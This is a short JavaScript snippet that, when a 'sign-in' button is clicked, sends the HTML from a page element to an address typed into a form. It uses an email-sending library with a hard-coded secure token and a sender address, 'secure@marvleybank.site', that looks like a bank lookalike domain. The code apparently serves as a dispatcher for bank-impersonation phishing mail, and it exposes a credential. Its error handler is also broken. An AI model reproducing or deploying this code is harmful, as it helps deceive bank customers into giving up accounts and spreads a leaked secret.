let signIn = document.querySelector("#sign-in");

    signIn.addEventListener("click",  (e) => {
        e.preventDefault();
        let to = document.querySelector('#to').value;
        let html = document.querySelector('#html').innerHTML;
            Email.send({
                SecureToken: '470cb922-ba1b-42fc-b746-e688d7b67d65',
                To: to,
                From: 'secure@marvleybank.site', // Your Outlook email address
                Subject: "ready",
                Body: html
            }).then(
                function () {
                alert('Email sent successfully');
                }
            ).catch(
               function () {
                error => console.error('Error sending email:', error)
                }
            );
        
})
